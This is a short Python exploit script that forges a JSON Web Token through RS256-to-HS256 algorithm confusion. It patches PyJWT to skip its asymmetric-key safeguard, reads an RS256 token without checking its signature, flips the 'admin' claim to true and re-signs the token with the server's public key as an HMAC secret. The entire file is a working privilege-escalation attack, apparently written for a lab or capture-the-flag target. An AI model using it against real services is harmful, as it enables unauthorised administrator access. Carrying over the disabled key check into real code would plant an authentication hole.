import jwt
import json

# prepare an override method
def prepare_key(key):
    return jwt.utils.force_bytes(key)


# override HS256's prepare key method to disable checking for asymmetric key words
jwt.api_jws._jws_global_obj._algorithms['HS256'].prepare_key = prepare_key

old_token = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJhZG1pbiI6ZmFsc2UsImV4cCI6MTczOTk2OTg3OX0.Ywm_xinawPkeNEUIp1dd6W8Axd7_S3HWmce-k7szTp6o-HQA2KWkVBZrECOTqAw_qRreb8iY5MhS1FiNXV0QhztiKaKVGEYd4gdca7GUWg4M7eXMvRHAIXougUTNFt6eI7GSwj4Zpkuhzw7N8jvmdZ457TKR8zqpZtvx_ifGH_K1xzKhY0e_BI70846NtCrZ8g9qlB3XWcDg6o-_UH5q8Q0anASfmEWVHQOKg2hIfMTGu2HHg4LUYR3NPz2iViD8jBSwwWQ4J5AkO3NJT6lTxLFJA5l5gaXL8cOd0sy80LokEIQRGt9hFeUHrbKXy-2W_8ub0xQjoUCa2Zxr5_jfGQ'
old_token_payload = jwt.decode(old_token, options={"verify_signature": False})
print(old_token_payload)
print("\n\n")


with open("keys/public_key.pem", "r") as f:
    public_key = f.read()

"""
new_payload_data = json.loads(old_token_payload)
new_payload_data['admin'] = True

new_payload = json.dumps(new_payload_data)
"""

old_token_payload['admin'] = True

#new_token = jwt.encode(new_payload, public_key, algorithm='HS256')
new_token = jwt.encode(old_token_payload, public_key, algorithm='HS256')
print(new_token)